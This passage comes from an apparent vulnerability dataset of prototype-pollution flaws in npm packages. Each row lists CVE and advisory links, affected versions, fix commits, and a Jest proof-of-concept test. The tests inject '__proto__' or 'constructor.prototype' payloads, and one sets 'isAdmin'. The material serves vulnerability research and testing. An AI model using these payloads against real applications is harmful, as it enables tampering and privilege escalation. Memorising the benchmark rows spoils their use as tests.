  dh.set(obj, ""__proto__.polluted"", ""yes"");

  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/sharpred/deepHas/commit/2fe011713a6178c50f7deb6f039a8e5435981e20,deepHas.js:65:20,https://security.snyk.io/vuln/SNYK-JS-DEEPHAS-1039845; https://github.com/advisories/GHSA-4fr2-j4g9-mppf
prototype-pollution,,inireader,1.0.0,2.0.0,prototype-pollution/inireader_1.0.0,"//https://snyk.io/vuln/SNYK-JS-INIREADER-1054843
test(""prototype pollution in inireader"", () => {
  const iniReader = require(""inireader"");
  const path = require(""path"");
  const parser = new iniReader.IniReader();

  let obj = {};
  expect({}.polluted).toBe(undefined);

  parser.load(path.resolve(__dirname, ""./payload.ini""));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/Ajnasz/IniReader/commit/c260e4e9050c731dbdb88e1d2e23e851528d3d93,lib/inireadercore.js:310:60,https://security.snyk.io/vuln/SNYK-JS-INIREADER-1054843; 
prototype-pollution,CVE-2020-15256,object-path,0.11.4,0.11.5,prototype-pollution/object-path_0.11.0,"//https://hackerone.com/reports/878332
test(""prototype pollution in object-path"", () => {
  const setPath = require(""object-path-set"");

  expect({}.polluted).toBe(undefined);
  setPath({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/skratchdot/object-path-set/commit/55f06d75abf5885f9cba3b7760acb38d7d7d06c0,index.js:19:13,https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1017036; https://github.com/advisories/GHSA-v39p-96qg-c8rf; https://hackerone.com/reports/878332
prototype-pollution,CVE-2020-28281,set-object-value,0.0.5, 0.0.6,prototype-pollution/set-object-value_0.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28281
test(""prototype pollution in setObjectValue"", () => {
  var setObjectValue = require(""set-object-value"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  setObjectValue(obj, [""__proto__"", ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/react-atomic/react-atomic-organism/commit/c8ec63388f7785078cb27275b56ed955ffd3db6c,build/cjs/src/index.js:24:15,https://security.snyk.io/vuln/SNYK-JS-SETOBJECTVALUE-1054931; https://github.com/advisories/GHSA-4jj4-m52p-8rx3
prototype-pollution,,@lyngs/digger,1.0.7,,prototype-pollution/lyngs-digger_1.0.7,"//https://security.snyk.io/vuln/SNYK-JS-LYNGSDIGGER-1069826
test(""prototype pollution in @lyngs/digge"", () => {
  const { digger } = require(""@lyngs/digger"");
  expect({}.polluted).toBe(undefined);
  digger({}, ""__proto__.polluted"", ""yes"", { extend: true });
  expect({}.polluted).toBe(""yes"");
});
",,digger/dist/index.js:2120:23,https://security.snyk.io/vuln/SNYK-JS-LYNGSDIGGER-1069826; 
prototype-pollution,,convict,6.0.0,6.0.1,prototype-pollution/convict_6.0.0,"//https://snyk.io/vuln/SNYK-JS-CONVICT-1062508
test(""prototype pollution in node-dig"", () => {
  const convict = require(""convict"");
  let obj = {};
  const config = convict(obj);

  expect({}.polluted).toBe(undefined);

  config.set(""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,src/main.js:565:24,https://security.snyk.io/vuln/SNYK-JS-CONVICT-1062508; 
prototype-pollution,,node-dig,1.0.1,,prototype-pollution/node-dig_1.0.1,"//https://snyk.io/vuln/SNYK-JS-NODEDIG-1069825
test(""prototype pollution in node-dig"", () => {
  const nodeDig = require(""node-dig"");
  expect({}.polluted).toBe(undefined);

  nodeDig({}, [""__proto__"", ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,lib/dig/index.js:4:33,https://security.snyk.io/vuln/SNYK-JS-NODEDIG-1069825; 
prototype-pollution, CVE-2021-25952,just-safe-set,1.0.0,2.2.2,prototype-pollution/just-safe-set_1.0.0,"//https://security.snyk.io/vuln/SNYK-JS-JUSTSAFESET-1316267
test(""prototype pollution in just-safe-set"", () => {
  const justSafeSet = require(""just-safe-set"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  justSafeSet(obj, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/angus-c/just/commit/dd57a476f4bb9d78c6f60741898dc04c71d2eb53,index.js:36:17,https://security.snyk.io/vuln/SNYK-JS-JUSTSAFESET-1316267; https://github.com/advisories/GHSA-v26w-gcxh-v4r7
prototype-pollution,CVE-2021-23807,jsonpointer,4.0.0,5.0.0,prototype-pollution/jsonpointer_4.0.0,"//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288
test(""prototype pollution in jsonpointer"", () => {
  const jsonpointer = require(""jsonpointer"");

  expect({}.polluted).toBe(undefined);
  jsonpointer.set({}, [[""proto""], [""__proto__""], ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/janl/node-jsonpointer/commit/a0345f3550cd9c4d89f33b126390202b89510ad4,jsonpointer.js:43:18,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288; https://github.com/advisories/GHSA-282f-qqgm-c34q
prototype-pollution,,style-dictionary,2.10.2,2.10.3,prototype-pollution/style-dictionary_2.10.2,"//https://snyk.io/vuln/SNYK-JS-STYLEDICTIONARY-1080632
test(""prototype pollution in style-dictionary"", () => {
  const StyleDictionary = require(""style-dictionary"");
  const obj = {};
  let opts = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');

  expect({}.polluted).toBe(undefined);

  StyleDictionary.extend(opts);
  expect({}.polluted).toBe(""yes"");
});
",,lib/utils/deepExtend.js:76:26,https://security.snyk.io/vuln/SNYK-JS-STYLEDICTIONARY-1080632; 
prototype-pollution,,@brikcss/merge,1.3.0,,prototype-pollution/brikcss-merge_1.3.0,"//https://security.snyk.io/vuln/SNYK-JS-BRIKCSSMERGE-1727594
test(""prototype pollution in @brikcss/merge"", () => {
  const merge = require(""@brikcss/merge"");
  let obj = {};
  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",,merge/dist/lib/merge.js:2:1599,https://security.snyk.io/vuln/SNYK-JS-BRIKCSSMERGE-1727594; 
prototype-pollution,,mquery,3.2.1,3.2.5,prototype-pollution/mquery_3.2.1,"//https://snyk.io/vuln/SNYK-JS-MQUERY-1050858
test(""prototype pollution in mquery"", () => {
  const mquery = require(""mquery"");
  let obj = {};
  var payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');

  expect({}.polluted).toBe(undefined);

  var m = mquery(payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/aheckmann/mquery/commit/158f059e058579d2d08c2f1380689f5f69336778,lib/utils.js:137:15,https://security.snyk.io/vuln/SNYK-JS-MQUERY-1089718; https://github.com/advisories/GHSA-45q2-34rf-mr94
prototype-pollution,CVE-2020-8158,typeorm,0.2.24,0.2.25,prototype-pollution/typeorm_0.2.24,"//https://hackerone.com/reports/869574

function isObject(item) {
  return item && typeof item === ""object"" && !Array.isArray(item);
}
const assert = require(""assert"");

function mergeDeep(target, ...sources) {
  if (!sources.length) return target;
  const source = sources.shift();

  if (isObject(target) && isObject(source)) {
    for (const key in source) {
      const value = source[key];
      if (value instanceof Promise) continue;

      if (
        isObject(value) &&
        !(value instanceof Map) &&
        !(value instanceof Set) &&
        !(value instanceof Date) &&
        !(value instanceof Buffer) &&
        !(value instanceof RegExp) &&
        !(value instanceof URL)
      ) {
        if (!target[key])
          Object.assign(target, {
            [key]: Object.create(Object.getPrototypeOf(value)),
          });
        mergeDeep(target[key], value);
      } else {
        Object.assign(target, { [key]: value });
      }
    }
  }

  return mergeDeep(target, ...sources);
}

test(""prototype pollution in typeORM"", () => {
  // const util = require(""typeorm/util/OrmUtils"");
  const a = {};
  const b = JSON.parse(`{""__proto__"":{""polluted"":""yes""}}`);

  expect({}.polluted).toBe(undefined);

  // util.OrmUtils.mergeDeep(a, b);
  mergeDeep(a, b);
  expect({}.polluted).toBe(""yes"");
});
",,build/utils.js:391:28,https://security.snyk.io/vuln/SNYK-JS-TYPEORM-590152; https://github.com/advisories/GHSA-pf2j-9qmp-jqr2
prototype-pollution,CVE-2020-7721,node-oojs,1.4.0,,prototype-pollution/node-oojs_1.4.0,"// https://snyk.io/vuln/SNYK-JS-NODEOOJS-598678
test(""prototype pollution in node-oojs"", () => {
  expect({}.polluted).toBe(undefined);

  require(""node-oojs"");
  oojs.setPath({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).not.toBe(undefined);
});
",,bin/format/oojs.js:65:39,https://security.snyk.io/vuln/SNYK-JS-NODEOOJS-598678; https://github.com/advisories/GHSA-j4rw-x3vg-c8r7
prototype-pollution,CVE-2021-23329,nested-object-assign,1.0.3,1.0.4,prototype-pollution/nested-object-assign_1.0.3,"//https://snyk.io/vuln/SNYK-JS-NESTEDOBJECTASSIGN-1065977

test(""prototype pollution in nested-object-assign"", () => {
  const assign = require(""nested-object-assign"");
  expect({}.polluted).toBe(undefined);
  assign({}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));

  expect({}.polluted).toBe(""yes"");
});
",,lib/nestedObjectAssign.js:1:787,https://security.snyk.io/vuln/SNYK-JS-NESTEDOBJECTASSIGN-1065977; https://github.com/advisories/GHSA-c497-v8pv-ch6x
prototype-pollution,,plain-object-merge,1.0.1,1.0.2,prototype-pollution/plain-object-merge_1.0.1,"//https://hackerone.com/reports/871156
test(""prototype pollution in plain-object-merge"", () => {
  const merge = require(""plain-object-merge"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');

  obj = {};

  expect({}.polluted).toBe(undefined);

  merge([{}, payload]);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/fabiospampinato/plain-object-merge/commit/e2b59efa2216957815643c48797e2e2eae8ca2b2,dist/index.js:18:29,https://security.snyk.io/vuln/SNYK-JS-PLAINOBJECTMERGE-1085643; 
prototype-pollution,CVE-2021-3918,json-schema,0.3.0,0.4.0,prototype-pollution/json-schema_0.3.0,"//https://huntr.dev/bounties/bb6ccd63-f505-4e3a-b55f-cd2662c261a9/
test(""prototype pollution in json-schema"", () => {
  const { validate } = require(""json-schema"");
  const instance = JSON.parse(`
    {
      ""$schema"":{
        ""type"": ""object"",
        ""properties"":{
          ""__proto__"": {
            ""type"": ""object"",
            
            ""properties"":{
              ""polluted"": {
                  ""type"": ""string"",
                  ""default"": ""yes""
              }
            }
          }
        },
        ""__proto__"": {}
      }
    }`);

  expect({}.polluted).toBe(undefined);

  validate(instance);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741,lib/validate.js:217:27,https://huntr.dev/bounties/bb6ccd63-f505-4e3a-b55f-cd2662c261a9/; https://github.com/advisories/GHSA-896r-f27r-55mw; https://security.snyk.io/vuln/SNYK-JS-JSONSCHEMA-1920922
prototype-pollution,,flat-wrap,1.0.2,,prototype-pollution/flat-wrap_1.0.2,"test(""prototype pollution in flat-wrap"", () => {
  const { unflatten } = require(""flat-wrap"");

  expect({}.polluted).toBe(undefined);

  unflatten({
    ""__proto__.polluted"": ""yes"",
  });

  expect({}.polluted).toBe(""yes"");
});
",,index.js:193:43,https://github.com/advisories/GHSA-g7h8-p22m-2rvx; 
prototype-pollution,CVE-2021-25915,changeset,0.1.0,0.2.6,prototype-pollution/changeset_0.1.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25915
test(""prototype pollution in changeset"", () => {
  expect({}.polluted).toBe(undefined);

  const changeset = require(""changeset"");
  const patch = [{ type: ""put"", key: [""__proto__"", ""polluted""], value: ""yes"" }];
  changeset.apply(patch, {}, true);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/eugeneware/changeset/commit/9e588844edbb9993b32e7366cc799262b4447f99,index.js:81:25,https://security.snyk.io/vuln/SNYK-JS-CHANGESET-1083989; 
prototype-pollution,CVE-2020-28450,decal,2.1.3,,prototype-pollution/decal_2.1.3,"//https://snyk.io/vuln/SNYK-JS-DECAL-1051028
test(""prototype pollution in decal"", () => {
  const decal = require(""decal"");

  expect({}.polluted).toBe(undefined);

  const o = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  decal.extend({}, true, o);

  expect({}.polluted).toBe(""yes"");
});
",,src/utils/extend.js:50:62,https://security.snyk.io/vuln/SNYK-JS-DECAL-1051028; https://github.com/advisories/GHSA-j32x-j8pj-pg2h
prototype-pollution,CVE-2021-3645,@viking04/merge,1.0.0,1.0.2,prototype-pollution/viking04-merge_1.0.0,"//https://github.com/viking04/merge/commit/baba40332080b38b33840d2614df6d4142dedaf6
test(""prototype pollution in config-handler"", () => {
  const merge = require(""@viking04/merge"");
  expect({}.polluted).toBe(undefined);

  let a = {};
  var prototype_pollution_test = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  merge(a, prototype_pollution_test);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/viking04/merge/commit/baba40332080b38b33840d2614df6d4142dedaf6,merge/index.js:9:18,https://security.snyk.io/vuln/SNYK-JS-VIKING04MERGE-1584118; https://github.com/advisories/GHSA-cqqh-49mx-fq63
prototype-pollution,CVE-2021-23438,mpath,0.4.1,0.8.4,prototype-pollution/mpath_0.4.1,"//https://hackerone.com/reports/390860
test(""prototype pollution in mpath "", () => {
  var mpath = require(""mpath"");

  var obj = {};

  expect({}.polluted).toBe(undefined);

  mpath.set(""__proto__.polluted"", ""yes"", obj);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/aheckmann/mpath/commit/89402d2880d4ea3518480a8c9847c541f2d824fc,lib/index.js:269:17,https://security.snyk.io/vuln/SNYK-JS-MPATH-1577289; https://github.com/advisories/GHSA-p92x-r36w-9395
prototype-pollution,CVE-2020-7722,nodee-utils,1.2.2,1.2.3,prototype-pollution/nodee-utils_1.2.2,"//https://snyk.io/vuln/SNYK-JS-NODEEUTILS-598679

test(""prototype pollution in nodee-utils"", () => {
  const { object } = require(""nodee-utils"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  object.deepSet({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/nodee-apps/utils/commit/52460d936c52f03c9907bc99ac5e890970cef83c,lib/object.js:210:40,https://security.snyk.io/vuln/SNYK-JS-NODEEUTILS-598679; https://github.com/advisories/GHSA-p6jh-p7q8-pcrg
prototype-pollution,CVE-2020-7639,@eivifj/dot,1.0.2,1.0.3,prototype-pollution/eivifj-dot_1.0.2,"//https://snyk.io/vuln/SNYK-JS-EIVIFJDOT-564435
test(""prototype pollution in @eivifj/dot"", () => {
  const a = require(""@eivifj/dot"");
  const path = ""__proto__.polluted"";

  expect({}.polluted).toBe(undefined);

  a.set({}, path, ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b,dot/index.js:22:13,https://security.snyk.io/vuln/SNYK-JS-EIVIFJDOT-564435; 
prototype-pollution,,i18next,19.7.0,19.8.5,prototype-pollution/i18next_19.7.0,"//https://hackerone.com/reports/968355#:~:text=It%20allows%20to%20set%20many,example%2C%20you%20can%20call%20i18next.&text=To%20pollute%20Object%20you%20could,polluted%3A%20true%20%7D%20%7D%20%7D%20.

// const i18next = require(""i18next/dist/cjs/i18next"");

function deepExtend(target, source, overwrite) {
  /* eslint no-restricted-syntax: 0 */
  for (const prop in source) {
    if (prop !== ""__proto__"") {
      if (prop in target) {
        // If we reached a leaf string in target or source then replace with source or skip depending on the 'overwrite' switch
        if (
          typeof target[prop] === ""string"" ||
          target[prop] instanceof String ||
          typeof source[prop] === ""string"" ||
          source[prop] instanceof String
        ) {
          if (overwrite) target[prop] = source[prop];
        } else {
          deepExtend(target[prop], source[prop], overwrite);
        }
      } else {
        target[prop] = source[prop];
      }
    }
  }
  return target;
}

test(""prototype pollution in i18next "", () => {
  const translations =
    '{ ""constructor"": { ""prototype"": { ""polluted"": ""yes""} } }';
  const existingData = {};

  expect({}.polluted).toBe(undefined);

  deepExtend(existingData, JSON.parse(translations), true);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/i18next/i18next/commit/932f5f662893376254d826e9b01dc4e4c0cd91c0,build/utils.js:391:28,https://security.snyk.io/vuln/SNYK-JS-I18NEXT-1065979; https://github.com/advisories/GHSA-cmh5-qc8w-xvcq
prototype-pollution,,shvl,2.0.1,2.0.3,prototype-pollution/shvl_2.0.1,"//https://snyk.io/vuln/SNYK-JS-SHVL-1085284

test(""prototype pollution in shvl"", () => {
  var shvl = require(""shvl"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  shvl.set(obj, ""constructor.prototype.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/robinvdvleuten/shvl/commit/4ed0edfa70f7778556f7b7e9ef1ee5d6d002fce2,index.js:10:40,https://security.snyk.io/vuln/SNYK-JS-SHVL-1085284; 
prototype-pollution,CVE-2020-15256,object-path-set,1.0.0,1.0.1,prototype-pollution/object-path-set_1.0.0,"//https://snyk.io/vuln/SNYK-JS-OBJECTPATH-1017036
test(""prototype pollution in object-path-set "", () => {
  const setPath = require(""object-path-set"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  setPath({}, ""__proto__.polluted"", ""yes"");
  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/skratchdot/object-path-set/commit/55f06d75abf5885f9cba3b7760acb38d7d7d06c0,index.js:19:13,https://security.snyk.io/vuln/SNYK-JS-OBJECTPATHSET-607908; https://github.com/advisories/GHSA-cwx2-736x-mf6w
prototype-pollution,CVE-2020-7701,madlib-object-utils,0.1.6,0.1.7,prototype-pollution/madlib-object-utils_0.1.6,"//https://snyk.io/vuln/SNYK-JS-MADLIBOBJECTUTILS-598676
test(""prototype pollution in madlib-object-utils"", () => {
  expect({}.polluted).toBe(undefined);

  const objectUtils = require(""madlib-object-utils"");
  objectUtils.setValue(""__proto__.polluted"", {}, ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,lib/utils.js:56:22,https://security.snyk.io/vuln/SNYK-JS-MADLIBOBJECTUTILS-598676; https://github.com/advisories/GHSA-jvf5-q4h5-2jmj
prototype-pollution,CVE-2019-10744,lodash,4.17.10,4.17.12,prototype-pollution/lodash_4.17.10,"//https://security.snyk.io/vuln/SNYK-JS-LODASH-450202
test(""prototype pollution in lodash"", () => {
  const mergeFn = require(""lodash"").defaultsDeep;
  const payload = '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}';
  expect({}.polluted).toBe(undefined);

  mergeFn({}, JSON.parse(payload));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/sailshq/lodash/pull/1/commits/c3fd203b3be87a8177f7f00824033c95f981f984,lodash.js:2573:21,https://security.snyk.io/vuln/SNYK-JS-LODASH-450202; https://github.com/advisories/GHSA-jf85-cpcp-j695
prototype-pollution,CVE-2020-28503,copy-props,2.0.4,2.0.5,prototype-pollution/copy-props_2.0.4,"//https://snyk.io/vuln/SNYK-JS-COPYPROPS-1082870
test(""prototype pollution in copy-props"", () => {
  expect({}.polluted).toBe(undefined);

  const copyProps = require(""copy-props"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  copyProps(JSON.parse(malicious_payload), {});

  expect({}.polluted).toBe(""yes"");
});
",,index.js:197:14,https://security.snyk.io/vuln/SNYK-JS-COPYPROPS-1082870; https://github.com/advisories/GHSA-897m-rjf5-jp39
prototype-pollution,CVE-2021-23373,set-deep-prop,1.0.0,,prototype-pollution/set-deep-prop_1.0.0,"//https://snyk.io/vuln/SNYK-JS-SETDEEPPROP-1083231
test(""prototype pollution in safe-object2"", () => {
  const setDeepProp = require(""set-deep-prop"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  setDeepProp({}, [""__proto__"", ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,set-deep-prop.js:20:34,https://security.snyk.io/vuln/SNYK-JS-SETDEEPPROP-1083231; 
prototype-pollution,,fast-json-patch,2.0.4,2.2.1,prototype-pollution/fast-json-patch_2.0.4,"//https://github.com/Starcounter-Jack/JSON-Patch/issues/216
test(""prototype pollution in fast-json-patch"", () => {
  let fp = require(""fast-json-patch"");
  const patch = [{ op: ""replace"", path: ""/__proto__/polluted"", value: ""yes"" }];

  expect({}.polluted).toBe(undefined);

  fp.applyPatch({}, patch);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/Starcounter-Jack/JSON-Patch/pull/219/commits/dd5d353f5d65888aeac91359484a73f0e2a9e5bd,lib/core.js:28:18,https://security.snyk.io/vuln/SNYK-JS-FASTJSONPATCH-595663; 
prototype-pollution,CVE-2021-32736,think-helper,1.1.0,1.1.7,prototype-pollution/think-helper_1.1.0,"//
test(""prototype pollution in think-helper"", () => {
  const a = require(""think-helper"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  a.extend(obj, JSON.parse('{""__proto__"":{""polluted"":""yes""}}'));

  expect({}.polluted).toBe(""yes"");
});
",,index.js:122:22,https://security.snyk.io/vuln/SNYK-JS-THINKHELPER-1315383; https://github.com/advisories/GHSA-vr5m-3h59-7jcp
prototype-pollution,CVE-2019-10746,mixin-deep,2.0.0,2.0.1,prototype-pollution/mixin-deep_2.0.0,"//https://snyk.io/vuln/SNYK-JS-MIXINDEEP-450212
test(""prototype pollution in mixin-deep "", () => {
  const mixin = require(""mixin-deep"");
  const payload = '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}';

  let obj = {};

  expect({}.polluted).toBe(undefined);

  mixin({}, JSON.parse(payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/mixin-deep/commit/8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9,index.js:21:17,https://security.snyk.io/vuln/SNYK-JS-MIXINDEEP-450212; https://github.com/advisories/GHSA-fhjf-83wg-r2j9
prototype-pollution,CVE-2021-4278,tree-kit,0.6.1,0.7.0,prototype-pollution/tree-kit_0.6.1,"test(""prototype pollution in tree-kit"", () => {
  const { dotPath } = require('tree-kit')
  obj = {};
  expect({}.polluted).toBe(undefined);
  dotPath.set({}, [""__proto__"", ""polluted""], ""yes"") 
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/cronvel/tree-kit/commit/c90d45f4f0e1266867be136670eddeb99b2a32a5,,https://security.snyk.io/vuln/SNYK-JS-TREEKIT-1077068; 
prototype-pollution,CVE-2020-7641,grunt-util-property,0.0.2,,prototype-pollution/grunt-util-property_0.0.2,"//https://snyk.io/vuln/SNYK-JS-GRUNTUTILPROPERTY-565088
test(""prototype pollution in grunt-util-property"", () => {
  const grunt = require(""grunt"");
  const a = require(""grunt-util-property"");

  expect({}.polluted).toBe(undefined);

  let b = a(grunt);
  b.call({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,main.js:41:21,https://security.snyk.io/vuln/SNYK-JS-GRUNTUTILPROPERTY-565088; 
prototype-pollution,CVE-2020-7617,ini-parser,0.0.2,,prototype-pollution/ini-parser_0.0.2,"// https://snyk.io/vuln/SNYK-JS-INIPARSER-564122
test(""prototype pollution in ini-parser"", () => {
  expect({}.polluted).toBe(undefined);

  let a = require(""ini-parser"");
  a.parse(""[__proto__]\npolluted=yes"");

  expect({}.polluted).toBe(""yes"");
});
",,index.js:14:20,https://security.snyk.io/vuln/SNYK-JS-INIPARSER-564122; https://github.com/advisories/GHSA-96r7-mrqf-jhcc
prototype-pollution,CVE-2020-28274,deepref,1.1.1,1.2.1,prototype-pollution/deepref_1.1.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28274
test(""prototype pollution in deepref"", () => {
  expect({}.polluted).toBe(undefined);

  const deepref = require(""deepref"");
  deepref.set({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/isaymatato/deepref/commit/24935e6a1060cb09c641d3075982f0b44cfca4c2,index.js:29:28,https://security.snyk.io/vuln/SNYK-JS-DEEPREF-1049536; https://github.com/advisories/GHSA-7c7g-72q7-4xhm
prototype-pollution,CVE-2020-8203,lodash,4.17.11,4.17.16,prototype-pollution/lodash_4.17.11,"// https://hackerone.com/reports/712065
test(""prototype pollution in lodash"", () => {
  expect({}.polluted).toBe(undefined);

  const _ = require(""lodash"");
  _.zipObjectDeep([""__proto__.polluted""], [""yes""]);

  expect({}.polluted).toBe(""yes"");
});
",,lodash.js:2559:21,https://security.snyk.io/vuln/SNYK-JS-LODASH-608086; https://github.com//advisories/GHSA-p6mc-m468-83gw
prototype-pollution,CVE-2020-7714,confucious,0.0.12,,prototype-pollution/confucious_0.0.12,"//https://snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665
test(""prototype pollution in confucious"", () => {
  expect({}.polluted).toBe(undefined);

  const confucious = require(""confucious"");
  confucious.set(""__proto__:polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,confucious.js:48:21,https://security.snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665; https://github.com/advisories/GHSA-fmrr-mx6j-h3h5
prototype-pollution,CVE-2020-7707,property-expr,2.0.2,2.0.3,prototype-pollution/property-expr_2.0.2,"//https://hackerone.com/reports/910206
test(""prototype pollution in property-expr"", () => {
  let expr = require(""property-expr"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  expr.setter(""constructor.prototype.polluted"")(obj, ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jquense/expr/commit/df846910915d59f711ce63c1f817815bceab5ff7,index.js:55:28,https://security.snyk.io/vuln/SNYK-JS-PROPERTYEXPR-598800; https://github.com/advisories/GHSA-6fw4-hr69-g3rv
prototype-pollution,,rfc6902,4.0.2,5.0.0,prototype-pollution/rfc6902_4.0.2,"//https://security.snyk.io/vuln/SNYK-JS-RFC6902-1053318
test(""prototype pollution in rfc6902"", () => {
  expect({}.polluted).toBe(undefined);
  var rfc6902 = require(""rfc6902"");
  var obj = {};
  rfc6902.applyPatch(obj, [
    { op: ""add"", path: ""/__proto__/polluted"", value: ""yes"" },
  ]);
  expect({}.polluted).toBe(""yes"");
});
",,patch.js:57:21,https://security.snyk.io/vuln/SNYK-JS-RFC6902-1053318; 
prototype-pollution,CVE-2020-28462,ion-parser,0.5.2,,prototype-pollution/ion-parser_0.5.2,"//https://snyk.io/vuln/SNYK-JS-IONPARSER-1048971
test(""prototype pollution in ion-parser"", () => {
  const fs = require(""fs"");
  const path = require(""path"");
  const ION = require(""ion-parser"");

  let obj = {};
  expect({}.polluted).toBe(undefined);

  ION.parse(
    fs.readFileSync(path.resolve(__dirname, ""./payload.toml""), ""utf-8"")
  );
  expect({}.polluted).toBe(""yes"");
});
",,parser.js:359:13,https://security.snyk.io/vuln/SNYK-JS-IONPARSER-1048971; 
prototype-pollution,,keyd,1.3.4,1.4.3,prototype-pollution/keyd_1.3.4,"//https://hackerone.com/reports/877515
test(""prototype pollution in keyd"", () => {
  expect({}.polluted).toBe(undefined);

  const keyd = require(""keyd"");
  keyd({}).set(""__proto__.polluted"", ""yes""); //payload

  expect({}.polluted).toBe(""yes"");
});
",,index.js:76:60,https://security.snyk.io/vuln/SNYK-JS-KEYD-674472; 
prototype-pollution,,objutil,2.17.3,,prototype-pollution/objutil_2.17.3,"//https://snyk.io/vuln/SNYK-JS-OBJUTIL-559496

test(""prototype pollution in objutil"", () => {
  const { merge, remove } = require(""objutil"");

  let a = { x: 1, y: { w: 1, z: 2 } };
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  result = merge(a, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",,dist/objutil.cjs.js:192:59,https://security.snyk.io/vuln/SNYK-JS-OBJUTIL-559496; 
prototype-pollution,,prototyped.js,2.0.0,2.0.1,prototype-pollution/prototyped.js_2.0.0,"//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
test(""prototype pollution in merge-recursive"", () => {
  // const merge = require(""merge-recursive"").recursive;
  // const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  // obj = {};

  // expect({}.polluted).toBe(undefined);

  // merge({}, JSON.parse(malicious_payload));

  // expect({}.polluted).toBe(""yes"");

  const set = require(""prototyped.js/dist/object/set"").default;
  console.log(""Prototype before set"", {}.polluted);
  set({}, ""__proto__.isAdmin"", true);
  console.log(""Prototype after set"", {}.polluted);
});
",https://github.com/ardalanamini/prototyped.js/commit/3ab56e78250d3d5b44ac03938d3d04591b206730,lib/index.js:66:14,https://security.snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824; 
prototype-pollution,,objtools,3.0.0,,prototype-pollution/objtools_3.0.0,"//https://hackerone.com/reports/878394

test(""prototype pollution in objtools"", () => {
  const objtools = require(""objtools"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}'); //payload
  obj = {};

  expect({}.polluted).toBe(undefined);

  objtools.merge({}, payload);
  expect({}.polluted).toBe(""yes"");
});
",,lib/index.js:440:18,https://security.snyk.io/vuln/SNYK-JS-OBJTOOLS-674471; 
prototype-pollution,CVE-2020-7742,simpl-schema,1.10.0,1.10.2,prototype-pollution/simpl-schema_1.10.0,"//https://snyk.io/vuln/SNYK-JS-SIMPLSCHEMA-1016157
test(""prototype pollution in simpl-schema"", () => {
  const SimpleSchema = require(""simpl-schema"").default;
  let obj = {};

  expect({}.polluted).toBe(undefined);

  SimpleSchema.setDefaultMessages(
    JSON.parse('{""__proto__"":{""polluted"":""yes""}}')
  );
  expect({}.polluted).toBe(""yes"");
});
